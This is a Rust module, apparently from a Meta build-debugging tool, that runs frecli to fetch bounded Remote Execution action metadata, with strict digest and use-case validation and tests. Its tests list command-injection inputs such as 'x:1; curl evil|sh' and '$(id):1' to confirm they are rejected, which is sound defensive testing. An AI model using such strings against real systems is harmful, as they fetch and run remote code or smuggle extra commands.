/*
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is dual-licensed under either the MIT license found in the
 * LICENSE-MIT file in the root directory of this source tree or the Apache
 * License, Version 2.0 found in the LICENSE-APACHE file in the root directory
 * of this source tree. You may select, at your option, one of the
 * above-listed licenses.
 */

//! Explicit, bounded retrieval of RE command metadata.
//!
//! Prefer content already present in the event log. Nothing here fetches
//! automatically, discovers stream digests by scraping prose, or downloads an
//! input/output tree. `print-action` fetches Action and Command metadata only;
//! its text is not a structured argv/environment or evidence of an execution.
//! A current Action Cache result is not authenticated historical attempt data.
//!
//! Byte limits bound retained output, not frecli's own allocations or total
//! metadata transfer: print-action's referenced Command size and an AC response
//! size are not advertised by this CLI before it fetches them. Recorded stdout
//! and stderr are read from the local execution store, never fetched here.
//! Timeout/cancel kills the private child process group. Nonblocking Unix
//! sockets avoid pipe-reader threads that could outlive a canceled request.

use std::sync::atomic::AtomicBool;
use std::sync::atomic::Ordering;
use std::time::Duration;

pub const MAX_ACTION_BLOB_BYTES: u64 = 1024 * 1024;
pub const MAX_METADATA_TEXT_BYTES: usize = 256 * 1024;
pub const MAX_TOOL_STDERR_BYTES: usize = 64 * 1024;
pub const FETCH_TIMEOUT: Duration = Duration::from_secs(120);

#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash)]
pub enum Provenance {
    /// Content-addressed definition; not a statement about any attempt outcome.
    ActionDefinition,
    /// A result queried now, not joined to the captured historical attempt.
    CurrentCacheUnverified,
}

impl Provenance {
    pub fn label(self) -> &'static str {
        match self {
            Self::ActionDefinition => "CAS action definition (not execution output)",
            Self::CurrentCacheUnverified => "current Action Cache — historical match unverified",
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Hash)]
pub enum FetchKind {
    ActionMetadata {
        action_digest: String,
    },
    /// Explicit opt-in only. Returns prose; never promotes it to stream refs.
    CurrentCacheMetadata {
        action_digest: String,
    },
}

#[derive(Clone, Debug, PartialEq, Eq, Hash)]
pub struct FetchRequest {
    pub kind: FetchKind,
    /// The capture's use case when recorded. None uses frecli's own default;
    /// never substitute another build's hard-coded use case.
    pub use_case: Option<String>,
}

impl FetchRequest {
    pub fn provenance(&self) -> Provenance {
        match &self.kind {
            FetchKind::ActionMetadata { .. } => Provenance::ActionDefinition,
            FetchKind::CurrentCacheMetadata { .. } => Provenance::CurrentCacheUnverified,
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Outcome {
    Complete,
    Truncated,
    Cancelled,
    TimedOut,
    Failed,
    Refused,
}

impl Outcome {
    pub fn label(self) -> &'static str {
        match self {
            Self::Complete => "complete",
            Self::Truncated => "truncated",
            Self::Cancelled => "canceled",
            Self::TimedOut => "timed out",
            Self::Failed => "failed",
            Self::Refused => "refused",
        }
    }
}

#[derive(Clone, Debug)]
pub struct FetchResult {
    /// Echoed exactly so a caller can reject stale action/attempt responses.
    pub request: FetchRequest,
    pub provenance: Provenance,
    pub outcome: Outcome,
    pub text: String,
    /// Diagnostics from frecli, never the action's recorded stderr stream.
    pub tool_stderr: String,
    pub message: String,
    /// The requested digest's declared blob size, not the size of metadata text.
    pub declared_bytes: Option<u64>,
    /// Bytes actually read from tool stdout; a lower bound if stopped early.
    pub observed_bytes: u64,
    pub text_truncated: bool,
    pub tool_stderr_truncated: bool,
    pub lossy_utf8: bool,
    pub exit_code: Option<i32>,
    /// Display/copy only; never executed automatically. A private-directory
    /// placeholder is supplied for manually inspected Action Cache metadata.
    pub manual_argv: Vec<String>,
}

impl FetchResult {
    fn empty(request: &FetchRequest, outcome: Outcome, message: impl Into<String>) -> Self {
        Self {
            request: request.clone(),
            provenance: request.provenance(),
            outcome,
            text: String::new(),
            tool_stderr: String::new(),
            message: message.into(),
            declared_bytes: None,
            observed_bytes: 0,
            text_truncated: false,
            tool_stderr_truncated: false,
            lossy_utf8: false,
            exit_code: None,
            manual_argv: Vec::new(),
        }
    }
}

/// Validated CLI digest. Hash algorithms differ between captures; accepting
/// bounded hexadecimal hashes does not assert which algorithm produced one.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Digest {
    pub hash: String,
    pub size_bytes: u64,
}

impl Digest {
    pub fn parse(raw: &str) -> Result<Self, String> {
        let Some((hash, size)) = raw.split_once(':') else {
            return Err("digest must have hexadecimal-hash:decimal-size form".to_owned());
        };
        if hash.is_empty()
            || hash.len() > 128
            || !hash.bytes().all(|c| c.is_ascii_hexdigit())
            || size.is_empty()
            || size.len() > 20
            || !size.bytes().all(|c| c.is_ascii_digit())
        {
            return Err("invalid or oversized digest token".to_owned());
        }
        let size_bytes = size
            .parse::<u64>()
            .ok()
            .filter(|&size| size <= i64::MAX as u64)
            .ok_or_else(|| "digest size is outside the RE CLI's integer range".to_owned())?;
        Ok(Self {
            hash: hash.to_owned(),
            size_bytes,
        })
    }

    pub fn token(&self) -> String {
        format!("{}:{}", self.hash, self.size_bytes)
    }
}

/// The command "Copy full-input download" puts on the clipboard. `None` for a
/// digest that doesn't validate, and in the open-source build, which has no
/// `frecli`.
pub fn full_input_download_command(raw_digest: &str) -> Option<String> {
    if !cfg!(fbcode_build) {
        return None;
    }
    let digest = Digest::parse(raw_digest).ok()?;
    Some(format!("frecli cas download-action -- {}", digest.token()))
}

#[cfg(any(fbcode_build, test))]
struct Plan {
    digest: Digest,
    prefix: Vec<String>,
    output_limit: usize,
    current_cache: bool,
    manual_argv: Vec<String>,
}

#[cfg(any(fbcode_build, test))]
fn use_case_prefix(use_case: Option<&str>) -> Result<Vec<String>, String> {
    match use_case {
        None => Ok(Vec::new()),
        Some(value)
            if !value.is_empty()
                && value.len() <= 256
                && value.as_bytes()[0].is_ascii_alphanumeric()
                && value
                    .bytes()
                    .all(|c| c.is_ascii_alphanumeric() || b"_.:/-".contains(&c)) =>
        {
            // One flag=value argv element: a recorded value is never a flag,
            // shell expansion, environment assignment or second argument.
            Ok(vec![format!("--use-case={value}")])
        }
        Some(_) => Err("invalid recorded RE use-case identifier".to_owned()),
    }
}

#[cfg(any(fbcode_build, test))]
fn plan(request: &FetchRequest) -> Result<Plan, Box<FetchResult>> {
    let prefix = use_case_prefix(request.use_case.as_deref())
        .map_err(|message| Box::new(FetchResult::empty(request, Outcome::Refused, message)))?;
    let (raw, limit, output_limit, current_cache) = match &request.kind {
        FetchKind::ActionMetadata { action_digest } => (
            action_digest.as_str(),
            MAX_ACTION_BLOB_BYTES,
            MAX_METADATA_TEXT_BYTES,
            false,
        ),
        FetchKind::CurrentCacheMetadata { action_digest } => (
            action_digest.as_str(),
            MAX_ACTION_BLOB_BYTES,
            MAX_METADATA_TEXT_BYTES,
            true,
        ),
    };
    let digest = Digest::parse(raw)
        .map_err(|message| Box::new(FetchResult::empty(request, Outcome::Refused, message)))?;
    let mut manual_argv = vec!["frecli".to_owned()];
    manual_argv.extend(prefix.iter().cloned());
    match &request.kind {
        FetchKind::ActionMetadata { .. } => {
            manual_argv.extend(["cas", "print-action", "--"].map(str::to_owned));
            manual_argv.push(digest.token());
        }
        FetchKind::CurrentCacheMetadata { .. } => {
            manual_argv.extend(["action-cache", "get", "--list-only", "--"].map(str::to_owned));
            manual_argv.push(digest.token());
            manual_argv.push("<private-empty-output-dir>".to_owned());
        }
    }
    if digest.size_bytes > limit {
        let mut refused = FetchResult::empty(
            request,
            Outcome::Refused,
            format!(
                "declared blob size {} bytes exceeds the {limit}-byte fetch limit; the manual command is available for an explicit retrieval outside this UI",
                digest.size_bytes
            ),
        );
        refused.declared_bytes = Some(digest.size_bytes);
        refused.manual_argv = manual_argv;
        return Err(Box::new(refused));
    }
    Ok(Plan {
        digest,
        prefix,
        output_limit,
        current_cache,
        manual_argv,
    })
}

#[cfg(any(all(fbcode_build, unix), test))]
fn arguments(
    request: &FetchRequest,
    plan: &Plan,
    output_dir: &std::path::Path,
) -> Vec<std::ffi::OsString> {
    let mut args: Vec<std::ffi::OsString> = plan.prefix.iter().map(Into::into).collect();
    match &request.kind {
        FetchKind::ActionMetadata { .. } => {
            args.extend(["cas", "print-action", "--"].map(std::ffi::OsString::from));
            args.push(plan.digest.token().into());
        }
        FetchKind::CurrentCacheMetadata { .. } => {
            args.extend(["action-cache", "get", "--list-only", "--"].map(std::ffi::OsString::from));
            args.push(plan.digest.token().into());
            args.push(output_dir.into());
        }
    }
    args
}

/// Run only on a caller-owned background worker after an explicit user action.
/// The caller must associate the echoed request with its action/attempt identity
/// and discard stale results. Cancellation is cooperative during bounded reads.
#[cfg(fbcode_build)]
pub fn run(request: &FetchRequest, cancelled: &AtomicBool) -> FetchResult {
    if cancelled.load(Ordering::Relaxed) {
        return FetchResult::empty(
            request,
            Outcome::Cancelled,
            "canceled before starting frecli",
        );
    }
    let plan = match plan(request) {
        Ok(plan) => plan,
        Err(refused) => return *refused,
    };
    #[cfg(unix)]
    {
        unix::run(request, plan, cancelled)
    }
    #[cfg(not(unix))]
    {
        let mut refused = FetchResult::empty(
            request,
            Outcome::Refused,
            "bounded RE retrieval is currently supported on Linux and macOS only",
        );
        refused.declared_bytes = Some(plan.digest.size_bytes);
        refused.manual_argv = plan.manual_argv;
        refused
    }
}

#[cfg(not(fbcode_build))]
pub fn run(request: &FetchRequest, cancelled: &AtomicBool) -> FetchResult {
    if cancelled.load(Ordering::Relaxed) {
        return FetchResult::empty(request, Outcome::Cancelled, "Canceled before retrieval");
    }
    FetchResult::empty(
        request,
        Outcome::Refused,
        "Remote retrieval requires Meta's internal frecli; recorded commands and output remain available.",
    )
}

/// Keep at most `limit` bytes, even when a single read is much larger. The
/// caller stops the child on overflow; it does not drain an unbounded producer.
#[cfg(any(all(fbcode_build, unix), test))]
#[derive(Default)]
struct Captured {
    bytes: Vec<u8>,
    observed: u64,
    truncated: bool,
    eof: bool,
}

#[cfg(any(all(fbcode_build, unix), test))]
impl Captured {
    fn append(&mut self, bytes: &[u8], limit: usize) {
        self.observed = self.observed.saturating_add(bytes.len() as u64);
        let keep = limit.saturating_sub(self.bytes.len()).min(bytes.len());
        self.bytes.extend_from_slice(&bytes[..keep]);
        self.truncated |= keep < bytes.len();
    }
}

/// UTF-8 loss repair without first allocating an unbounded expanded lossy
/// string. A replacement character can require more bytes than its input;
/// the resulting display text still respects the same byte cap.
#[cfg(any(all(fbcode_build, unix), test))]
fn display_text(bytes: Vec<u8>, limit: usize) -> (String, bool, bool) {
    let bytes = match String::from_utf8(bytes) {
        Ok(mut text) => {
            let truncated = text.len() > limit;
            if truncated {
                let mut end = limit;
                while !text.is_char_boundary(end) {
                    end -= 1;
                }
                text.truncate(end);
            }
            return (text, false, truncated);
        }
        Err(error) => error.into_bytes(),
    };
    let mut out = String::with_capacity(bytes.len().min(limit));
    let mut rest = bytes.as_slice();
    let mut truncated = false;
    let mut lossy = false;
    while !rest.is_empty() {
        let (valid, invalid) = match std::str::from_utf8(rest) {
            Ok(valid) => (valid, None),
            Err(error) => (
                std::str::from_utf8(&rest[..error.valid_up_to()]).expect("validated UTF-8 prefix"),
                Some(
                    error
                        .error_len()
                        .unwrap_or(rest.len() - error.valid_up_to()),
                ),
            ),
        };
        let mut take = valid.len().min(limit.saturating_sub(out.len()));
        while !valid.is_char_boundary(take) {
            take -= 1;
        }
        out.push_str(&valid[..take]);
        if take < valid.len() {
            truncated = true;
            break;
        }
        rest = &rest[valid.len()..];
        if let Some(invalid) = invalid {
            // A retained byte prefix can end within an otherwise valid UTF-8
            // character. Disclose truncation, not damaged source text.
            if bytes.len() >= limit
                && rest.len() == invalid
                && std::str::from_utf8(rest).is_err_and(|e| e.error_len().is_none())
            {
                truncated = true;
                break;
            }
            if out
                .len()
                .saturating_add(char::REPLACEMENT_CHARACTER.len_utf8())
                > limit
            {
                truncated = true;
                break;
            }
            out.push(char::REPLACEMENT_CHARACTER);
            lossy = true;
            rest = &rest[invalid..];
        }
    }
    (out, lossy, truncated)
}

#[cfg(all(unix, any(fbcode_build, test)))]
mod unix {
    use std::fs;
    use std::io;
    use std::io::Read;
    use std::os::fd::OwnedFd;
    use std::os::unix::fs::DirBuilderExt;
    use std::os::unix::net::UnixStream;
    use std::os::unix::process::CommandExt;
    use std::path::PathBuf;
    use std::process::Child;
    use std::process::Command;
    use std::process::Stdio;
    use std::sync::atomic::AtomicU64;
    use std::time::Instant;
    use std::time::SystemTime;
    use std::time::UNIX_EPOCH;

    use super::*;

    const POLL: Duration = Duration::from_millis(5);
    const READ_SIZE: usize = 16 * 1024;
    const READS_PER_POLL: usize = 4;

    struct PrivateDir {
        path: PathBuf,
    }

    impl PrivateDir {
        fn create() -> io::Result<Self> {
            static NEXT: AtomicU64 = AtomicU64::new(0);
            let epoch = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_nanos();
            for _ in 0..16 {
                let path = std::env::temp_dir().join(format!(
                    "retrace-re-metadata-{}-{epoch}-{}",
                    std::process::id(),
                    NEXT.fetch_add(1, Ordering::Relaxed),
                ));
                match fs::DirBuilder::new().mode(0o700).create(&path) {
                    Ok(()) => return Ok(Self { path }),
                    Err(error) if error.kind() == io::ErrorKind::AlreadyExists => continue,
                    Err(error) => return Err(error),
                }
            }
            Err(io::Error::new(
                io::ErrorKind::AlreadyExists,
                "unable to create private metadata directory",
            ))
        }

        fn output(&self) -> PathBuf {
            self.path.join("result")
        }

        fn cleanup(&self) -> Option<String> {
            // --list-only may create this empty directory. Never recursively
            // erase unexpected files from a tool whose behavior has changed.
            let output = self.output();
            if let Err(error) = fs::remove_dir(&output)
                && error.kind() != io::ErrorKind::NotFound
            {
                return Some(format!(
                    "scratch directory retained at {}: {error}",
                    self.path.display()
                ));
            }
            fs::remove_dir(&self.path)
                .err()
                .filter(|error| error.kind() != io::ErrorKind::NotFound)
                .map(|error| {
                    format!(
                        "scratch directory retained at {}: {error}",
                        self.path.display()
                    )
                })
        }
    }

    impl Drop for PrivateDir {
        fn drop(&mut self) {
            drop(self.cleanup());
        }
    }

    struct ChildGroup {
        child: Child,
        reaped: bool,
    }

    impl ChildGroup {
        fn stop(&mut self) {
            if self.reaped {
                return;
            }
            // process_group(0) created this child's own group before exec.
            // No try_wait has reaped its leader on this path, so its PID
            // cannot have been reused for an unrelated group.
            if let Ok(pid) = i32::try_from(self.child.id())
                && pid > 0
            {
                // SAFETY: kill takes integer values, no borrowed memory. pid is
                // the positive, unreaped child/group id we created; negative pid
                // targets only that group.
                unsafe {
                    libc::kill(-pid, libc::SIGKILL);
                }
            }
            // A direct-child fallback also covers a failed group signal.
            self.child.kill().ok();
            self.child.wait().ok();
            self.reaped = true;
        }
    }

    impl Drop for ChildGroup {
        fn drop(&mut self) {
            self.stop();
        }
    }

    fn drain(reader: &mut UnixStream, into: &mut Captured, limit: usize) -> io::Result<()> {
        if into.eof || into.truncated {
            return Ok(());
        }
        let mut bytes = [0; READ_SIZE];
        for _ in 0..READS_PER_POLL {
            match reader.read(&mut bytes) {
                Ok(0) => {
                    into.eof = true;
                    break;
                }
                Ok(n) => {
                    into.append(&bytes[..n], limit);
                    if into.truncated {
                        break;
                    }
                }
                Err(error) if error.kind() == io::ErrorKind::WouldBlock => break,
                Err(error) if error.kind() == io::ErrorKind::Interrupted => continue,
                Err(error) => return Err(error),
            }
        }
        Ok(())
    }

    struct ProcessResult {
        stdout: Captured,
        stderr: Captured,
        outcome: Outcome,
        message: String,
        exit_code: Option<i32>,
    }

    fn capture(
        command: &mut Command,
        cancelled: &AtomicBool,
        output_limit: usize,
        stderr_limit: usize,
        timeout: Duration,
    ) -> io::Result<ProcessResult> {
        let (mut stdout, stdout_child) = UnixStream::pair()?;
        let (mut stderr, stderr_child) = UnixStream::pair()?;
        stdout.set_nonblocking(true)?;
        stderr.set_nonblocking(true)?;
        command
            .stdin(Stdio::null())
            .stdout(Stdio::from(OwnedFd::from(stdout_child)))
            .stderr(Stdio::from(OwnedFd::from(stderr_child)))
            .process_group(0);
        let mut child = ChildGroup {
            child: command.spawn()?,
            reaped: false,
        };
        // Declared after `child`, so it is dropped first: the slot is freed before the child is reaped.
        let _tracked = crate::interrupt::TrackedChild::track(child.child.id());
        // Command retains its Stdio handles after spawn; release those extra
        // parent copies so EOF means all actual writers closed their handles.
        command.stdout(Stdio::null()).stderr(Stdio::null());
        let started = Instant::now();
        let mut result = ProcessResult {
            stdout: Captured::default(),
            stderr: Captured::default(),
            outcome: Outcome::Failed,
            message: String::new(),
            exit_code: None,
        };
        loop {
            if cancelled.load(Ordering::Relaxed) {
                result.outcome = Outcome::Cancelled;
                result.message = "canceled; stopped the private frecli process group".to_owned();
                break;
            }
            if started.elapsed() >= timeout {
                result.outcome = Outcome::TimedOut;
                result.message =
                    "frecli exceeded the time limit; stopped its private process group".to_owned();
                break;
            }
            if let Err(error) = drain(&mut stdout, &mut result.stdout, output_limit)
                .and_then(|()| drain(&mut stderr, &mut result.stderr, stderr_limit))
            {
                result.message = format!("failed to read frecli output: {error}");
                break;
            }
            if result.stdout.truncated || result.stderr.truncated {
                result.outcome = Outcome::Truncated;
                result.message = "frecli output exceeded the capture limit; partial text retained and process stopped".to_owned();
                break;
            }
            // Do not reap while descendants still hold output handles: an
            // unreaped leader keeps the cancellation group identity stable.
            if result.stdout.eof && result.stderr.eof {
                match child.child.try_wait()? {
                    Some(status) => {
                        child.reaped = true;
                        result.exit_code = status.code();
                        result.outcome = if status.success() {
                            Outcome::Complete
                        } else {
                            Outcome::Failed
                        };
                        result.message = if status.success() {
                            String::new()
                        } else {
                            format!("frecli exited with {status}; see tool diagnostics")
                        };
                        break;
                    }
                    None => {}
                }
            }
            std::thread::sleep(POLL);
        }
        // Dropping nonblocking sockets cannot wait for a descendant's EOF.
        drop(stdout);
        drop(stderr);
        child.stop();
        Ok(result)
    }

    #[cfg(fbcode_build)]
    pub(super) fn run(request: &FetchRequest, plan: Plan, cancelled: &AtomicBool) -> FetchResult {
        let mut result = FetchResult::empty(request, Outcome::Failed, "");
        result.declared_bytes = Some(plan.digest.size_bytes);
        result.manual_argv = plan.manual_argv.clone();
        if cancelled.load(Ordering::Relaxed) {
            result.outcome = Outcome::Cancelled;
            result.message = "canceled before starting frecli".to_owned();
            return result;
        }
        let private = match PrivateDir::create() {
            Ok(private) => private,
            Err(error) => {
                result.message = format!("could not create private metadata directory: {error}");
                return result;
            }
        };
        let mut command = Command::new("frecli");
        command.args(arguments(request, &plan, &private.output()));
        command.current_dir(&private.path);
        match capture(
            &mut command,
            cancelled,
            plan.output_limit,
            MAX_TOOL_STDERR_BYTES,
            FETCH_TIMEOUT,
        ) {
            Ok(captured) => {
                result.outcome = captured.outcome;
                result.message = captured.message;
                result.exit_code = captured.exit_code;
                result.observed_bytes = captured.stdout.observed;
                result.text_truncated = captured.stdout.truncated;
                result.tool_stderr_truncated = captured.stderr.truncated;
                let (text, lossy, display_truncated) =
                    display_text(captured.stdout.bytes, plan.output_limit);
                result.text = text;
                result.lossy_utf8 = lossy;
                result.text_truncated |= display_truncated;
                let (stderr, _, stderr_truncated) =
                    display_text(captured.stderr.bytes, MAX_TOOL_STDERR_BYTES);
                result.tool_stderr = stderr;
                result.tool_stderr_truncated |= stderr_truncated;
                if result.outcome == Outcome::Complete
                    && (result.text_truncated || result.tool_stderr_truncated)
                {
                    result.outcome = Outcome::Truncated;
                    result.message =
                        "display text reached its byte cap after UTF-8 replacement".to_owned();
                }
            }
            Err(error) => result.message = format!("could not run frecli: {error}"),
        }
        if plan.current_cache {
            if !result.message.is_empty() {
                result.message.push('\n');
            }
            result.message.push_str("Current Action Cache metadata only; historical attempt match is unverified. Stream digests are not extracted from this text.");
        }
        if let Some(warning) = private.cleanup() {
            if !result.message.is_empty() {
                result.message.push('\n');
            }
            result.message.push_str(&warning);
        }
        result
    }

    #[cfg(test)]
    mod tests {
        use std::path::Path;

        use super::*;

        fn shell(script: &str) -> Command {
            // Fixed test programs only. Production commands never use a shell.
            let mut command = Command::new("/bin/sh");
            command.args(["-c", script]);
            command
        }

        #[test]
        fn captures_separate_tool_streams_and_nonzero_status() {
            let output = capture(
                &mut shell("printf metadata; printf warning >&2; exit 7"),
                &AtomicBool::new(false),
                100,
                100,
                Duration::from_secs(2),
            )
            .unwrap();
            assert_eq!(output.stdout.bytes, b"metadata");
            assert_eq!(output.stderr.bytes, b"warning");
            assert_eq!(output.exit_code, Some(7));
            assert_eq!(output.outcome, Outcome::Failed);
        }

        #[test]
        fn exact_cap_is_not_truncation_but_overflow_stops_the_child() {
            let exact = capture(
                &mut shell("printf abcd"),
                &AtomicBool::new(false),
                4,
                100,
                Duration::from_secs(2),
            )
            .unwrap();
            assert_eq!(exact.outcome, Outcome::Complete);
            assert_eq!(exact.stdout.bytes, b"abcd");
            let over = capture(
                &mut shell("while :; do printf abcde; done"),
                &AtomicBool::new(false),
                4,
                100,
                Duration::from_secs(2),
            )
            .unwrap();
            assert_eq!(over.outcome, Outcome::Truncated);
            assert_eq!(over.stdout.bytes, b"abcd");
            assert!(over.stdout.observed > 4);
        }

        #[test]
        fn timeout_does_not_wait_for_an_inherited_pipe_writer() {
            let started = Instant::now();
            let output = capture(
                &mut shell("sleep 30 & exit 0"),
                &AtomicBool::new(false),
                100,
                100,
                Duration::from_millis(40),
            )
            .unwrap();
            assert_eq!(output.outcome, Outcome::TimedOut);
            assert!(started.elapsed() < Duration::from_secs(20));
        }

        #[test]
        fn cancellation_stops_a_running_child_without_reader_threads() {
            let cancelled = AtomicBool::new(false);
            std::thread::scope(|scope| {
                scope.spawn(|| {
                    std::thread::sleep(Duration::from_millis(30));
                    cancelled.store(true, Ordering::Relaxed);
                });
                let started = Instant::now();
                let output = capture(
                    &mut shell("exec sleep 30"),
                    &cancelled,
                    100,
                    100,
                    Duration::from_secs(60),
                )
                .unwrap();
                assert_eq!(output.outcome, Outcome::Cancelled);
                assert!(started.elapsed() < Duration::from_secs(20));
            });
        }

        #[test]
        fn private_metadata_directory_is_private_and_empty_cleanup_is_narrow() {
            use std::os::unix::fs::PermissionsExt;
            let private = PrivateDir::create().unwrap();
            assert_eq!(
                fs::metadata(&private.path).unwrap().permissions().mode() & 0o777,
                0o700
            );
            fs::create_dir(private.output()).unwrap();
            assert!(private.cleanup().is_none());
            assert!(!private.path.exists());
        }

        #[test]
        fn unexpected_tool_files_are_preserved_not_recursively_deleted() {
            let private = PrivateDir::create().unwrap();
            let path = private.path.clone();
            let unexpected = path.join("unexpected");
            fs::write(&unexpected, b"preserve").unwrap();
            assert!(private.cleanup().unwrap().contains("retained"));
            drop(private);
            assert_eq!(fs::read(&unexpected).unwrap(), b"preserve");
            fs::remove_file(unexpected).unwrap();
            fs::remove_dir(path).unwrap();
        }

        #[test]
        fn current_cache_arguments_always_supply_private_list_only_destination() {
            let request = FetchRequest {
                kind: FetchKind::CurrentCacheMetadata {
                    action_digest: "abc:12".to_owned(),
                },
                use_case: Some("capture-use_case".to_owned()),
            };
            let plan = super::super::plan(&request).unwrap_or_else(|_| panic!("valid request"));
            let private = PrivateDir::create().unwrap();
            let args = arguments(&request, &plan, &private.output());
            assert_eq!(
                &args[..5],
                [
                    "--use-case=capture-use_case",
                    "action-cache",
                    "get",
                    "--list-only",
                    "--"
                ]
            );
            assert_eq!(args[5], "abc:12");
            assert_eq!(Path::new(&args[6]), private.output());
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn request(kind: FetchKind) -> FetchRequest {
        FetchRequest {
            kind,
            use_case: None,
        }
    }

    #[test]
    fn digest_tokens_reject_flags_shell_syntax_and_overflow() {
        for raw in [
            "",
            "--help",
            "-ab:1",
            "ab:1;echo",
            "ab:+1",
            "ab:-1",
            "ab:1:2",
            "ab: 1",
            "ab:1\n",
            "ab:9223372036854775808",
            "$(id):1",
            "ab\0:1",
        ] {
            assert!(Digest::parse(raw).is_err(), "accepted {raw:?}");
        }
        assert_eq!(Digest::parse("abcdef:0").unwrap().size_bytes, 0);
        assert_eq!(Digest::parse("ABC123:42").unwrap().token(), "ABC123:42");
        assert!(Digest::parse(&format!("{}:1", "a".repeat(129))).is_err());
    }

    #[test]
    fn full_input_download_command_only_carries_a_validated_digest() {
        assert_eq!(
            full_input_download_command("abc123:42"),
            cfg!(fbcode_build).then(|| "frecli cas download-action -- abc123:42".to_owned())
        );
        for raw in ["x:1; curl evil|sh", "--some-flag", ""] {
            assert_eq!(full_input_download_command(raw), None, "accepted {raw:?}");
        }
    }

    #[test]
    fn use_case_is_one_validated_argument_and_never_hard_coded() {
        assert!(use_case_prefix(None).unwrap().is_empty());
        assert_eq!(
            use_case_prefix(Some("continuous_citadel_fbcode")).unwrap(),
            ["--use-case=continuous_citadel_fbcode"]
        );
        for bad in ["", "--help", "a b", "a\nb", "$(id)", "foo;bar", "foo\0bar"] {
            assert!(use_case_prefix(Some(bad)).is_err());
        }
    }

    #[test]
    fn metadata_never_uses_download_action_or_output_tree_commands() {
        let request = request(FetchKind::ActionMetadata {
            action_digest: "abc:12".to_owned(),
        });
        let plan = plan(&request).unwrap_or_else(|_| panic!("valid request"));
        assert_eq!(plan.output_limit, MAX_METADATA_TEXT_BYTES);
        assert!(!plan.current_cache);
        assert_eq!(plan.manual_argv.last().map(String::as_str), Some("abc:12"));
        assert_eq!(
            arguments(&request, &plan, std::path::Path::new("/unused")),
            ["cas", "print-action", "--", "abc:12"]
        );
        assert_eq!(request.provenance(), Provenance::ActionDefinition);
    }

    #[test]
    fn metadata_size_is_checked_before_any_launch() {
        let oversized_request = request(FetchKind::ActionMetadata {
            action_digest: format!("abc:{}", MAX_ACTION_BLOB_BYTES + 1),
        });
        let refused = match plan(&oversized_request) {
            Ok(_) => panic!("oversized blob accepted"),
            Err(refused) => refused,
        };
        assert_eq!(refused.outcome, Outcome::Refused);
        assert_eq!(refused.declared_bytes, Some(MAX_ACTION_BLOB_BYTES + 1));
        assert!(refused.manual_argv.iter().any(|a| a == "print-action"));
    }

    #[test]
    fn invalid_request_and_pre_cancel_never_spawn_frecli() {
        let bad = request(FetchKind::ActionMetadata {
            action_digest: "--help".to_owned(),
        });
        assert_eq!(run(&bad, &AtomicBool::new(false)).outcome, Outcome::Refused);
        let valid = request(FetchKind::ActionMetadata {
            action_digest: "abc:12".to_owned(),
        });
        assert_eq!(
            run(&valid, &AtomicBool::new(true)).outcome,
            Outcome::Cancelled
        );
    }

    #[test]
    fn captured_bytes_and_lossy_display_remain_bounded() {
        assert_eq!(
            display_text(vec![b'a', 0xc3], 2),
            ("a".to_owned(), false, true)
        );
        let mut captured = Captured::default();
        assert!(!captured.eof);
        captured.append(b"abcd", 4);
        assert!(!captured.truncated);
        captured.append(b"more", 4);
        assert!(captured.truncated);
        assert_eq!(captured.observed, 8);
        assert_eq!(captured.bytes, b"abcd");
        assert_eq!(
            display_text(b"hello".to_vec(), 5),
            ("hello".to_owned(), false, false)
        );
        assert_eq!(
            display_text("a\u{e9}b".as_bytes().to_vec(), 2),
            ("a".to_owned(), false, true)
        );
        assert_eq!(
            display_text(b"hello".to_vec(), 0),
            (String::new(), false, true)
        );
        let (text, lossy, truncated) = display_text(vec![0xff, 0xff], 4);
        assert_eq!(text, char::REPLACEMENT_CHARACTER.to_string());
        assert!(lossy && truncated);
        assert!(text.len() <= 4);
        let (text, lossy, truncated) = display_text(vec![b'a', 0xf0, 0x9f], 10);
        assert_eq!(text, format!("a{}", char::REPLACEMENT_CHARACTER));
        assert!(lossy && !truncated);
    }
}
